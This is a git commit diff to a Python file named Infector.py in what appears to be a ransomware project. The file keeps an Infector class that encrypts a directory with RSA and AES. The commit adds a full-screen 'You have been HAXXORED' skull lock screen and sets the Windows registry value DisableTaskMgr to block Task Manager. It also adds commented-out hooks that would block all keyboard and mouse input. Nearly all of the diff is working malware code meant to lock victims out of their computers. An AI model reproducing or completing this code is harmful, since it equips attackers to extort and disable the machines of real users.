1c61078178cdf9a50ff2ddd282195bc4bd6457c1
Mina Messiha <mena.sb.109@gmail.com>
2018-12-05 22:38:07 -0800

    Added lock screen and input locking

--- RSAFileEncrypt/Infector.py
+++ RSAFileEncrypt/Infector.py
@@ -1,10 +1,13 @@
 import shutil
 import os, var, json, base64
+import pythoncom, pyHook 
 from RSAMain import RSAEncryption
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
+from tkinter import *
+from winreg import *
 
 '''
  You got totally
@@ -46,5 +49,42 @@ class Infector:
 def main():
     Infector().encryptDir()
 
-if __name__ == '__main__':
-    main()
+# if __name__ == '__main__':
+#     main()
+
+root = Tk()
+root.title('Infector')
+root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
+# root.overrideredirect(True)
+# root.config(cursor="none")
+root.configure(background='black')
+skull = Label(root, text=" @@@@@                                        @@@@@\n@@@@@@@                                      @@@@@@@\n@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@\n@@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@\n@@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@\n@@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@\n@@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@\n@@@@@@@    @@@@@@    @@@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@    @@@@@@    @@@@@\n@@@@@@@@@@@  @@@@@@@@@@\n@@@@@@@@@@  @@@@@@@@@\n@@   @@@@@@@@@@@@@@@@@   @@\n@@@@  @@@@ @ @ @ @ @@@@  @@@@\n@@@@@   @@@ @ @ @ @ @@@   @@@@@\n@@@@@      @@@@@@@@@@@@@      @@@@@\n@@@@          @@@@@@@@@@@          @@@@\n@@@@@              @@@@@@@              @@@@@\n@@@@@@@                                 @@@@@@@\n@@@@@                                   @@@@@\nYou have been HAXXORED")
+skull.config(font=("fixedsys", 17))
+skull.config(background="black")
+hackingGreen = "#%02x%02x%02x" % (102, 255, 0)
+skull.config(foreground="#66FF00")
+skull.grid(column=0, row=0)
+root.columnconfigure(0, weight=1)
+root.rowconfigure(0, weight=1)
+
+keyVal = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
+try:
+    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+except:
+    key = CreateKey(HKEY_CURRENT_USER, keyVal)
+SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)    
+
+# [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+# "DisableTaskMgr"=dword:00000001
+
+# def uMad(event):
+#     return False
+
+# hm = pyHook.HookManager()
+# hm.MouseAll = uMad
+# hm.KeyAll = uMad
+# hm.HookMouse()
+# hm.HookKeyboard()
+#pythoncom.PumpMessages()
+
+mainloop()
